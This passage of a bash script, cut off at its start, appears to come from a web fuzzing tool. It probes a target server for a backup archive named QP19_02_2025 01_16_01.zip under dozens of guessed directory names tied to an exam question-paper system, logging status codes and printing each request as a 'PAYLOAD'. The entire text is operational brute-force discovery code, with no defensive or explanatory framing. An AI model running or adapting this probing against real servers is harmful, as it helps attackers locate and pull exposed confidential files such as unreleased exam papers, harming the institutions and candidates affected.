" "${target}ProcessingSuiteQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
